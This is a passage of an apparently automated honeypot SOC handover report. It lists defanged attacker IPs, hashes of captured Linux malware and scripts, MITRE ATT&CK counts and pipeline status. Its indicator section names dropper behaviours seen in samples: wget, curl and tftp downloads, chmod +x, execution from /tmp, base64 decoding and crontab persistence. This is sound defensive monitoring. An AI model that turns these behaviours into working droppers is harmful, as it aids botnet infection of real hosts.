| `46.172.86[.]25` | 1 | 2026-08-11 13:01 | 2026-08-11 13:01 | 13s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]117` | 1 | 2026-08-11 14:54 | 2026-08-11 14:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-08-11 14:36 | 2026-08-11 14:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]7` | 1 | 2026-08-11 14:49 | 2026-08-11 14:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.135.21[.]18` | 1 | 2026-08-11 14:20 | 2026-08-11 14:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `89.151.179[.]167` | 1 | 2026-08-11 14:25 | 2026-08-11 14:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-11 13:58 | 2026-08-11 13:59 | 68s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | 1 | 2026-08-11 14:30 | 2026-08-11 14:30 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `136.116.129[.]132` | US | Google LLC | **100** ⚠️ | 3 |
| `179.48.238[.]14` | BR | R3 Network Servicos De Internet Ltda | **100** ⚠️ | 2 |
| `93.241.232[.]14` | DE | Deutsche Telekom AG | **100** ⚠️ | 50 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 6 |
| `164.92.115[.]22` | US | DigitalOcean, LLC | **100** ⚠️ | 7 |
| `182.60.128[.]241` | IN | Mahanagar Telephone Nigam Limited | **100** ⚠️ | 49 |
| `103.251.143[.]14` | IN | Fusionnet Web Services Limited | **100** ⚠️ | 50 |
| `81.191.233[.]203` | NO | GLOBALCONNECT AS | **100** ⚠️ | 0 |
| `49.206.194[.]29` | IN | Beam Telecom Pvt Ltd | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 183 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 171 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 55 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 53 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 53 |

---

## 🔕 False Positive Summary (32 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 15 below threshold 25 | 4 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 5 |
| AbuseIPDB score 7 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 285 cases |
| Tool 34  | Credential Extractor        | ✅ 180 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 86 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 32 filtered (11.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 65 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 171 priority case(s) shown individually · 33 recon entry/entries in table (11 group(s) consolidating 60 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-11T15:02:35Z_
